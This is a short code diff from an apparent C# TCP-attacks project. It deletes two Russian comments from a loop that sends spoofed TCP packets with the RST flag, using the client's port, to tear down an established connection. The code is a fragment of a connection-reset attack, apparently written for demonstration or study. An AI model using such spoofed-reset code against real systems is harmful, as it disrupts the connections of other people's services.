@@ -35,8 +35,6 @@ namespace TPCAttacks.Attacks
 
 				SendPacket(clientSocket, Packet.GetEmptyPacket(4, _clientPort, _serverEndPoint.Port, 1, 1, ack: true));
 
-                //Подключение установлено. Теперь пытаемся разорвать соединение
-
                 for (int i = 5; i < 100; i++)
                 {
                     if (token.IsCancellationRequested)
@@ -46,7 +44,6 @@ namespace TPCAttacks.Attacks
                     Thread.Sleep(100);
                     try
                     {
-                        //Отправляем пакеты с флагом RST и подставляем порт нашего клиента, типа это он отправил
                         SendPacket(clientSocket, Packet.GetEmptyPacket(4, _clientPort, _serverEndPoint.Port,
                             1, 1, rst: true, ack: true));
                     }
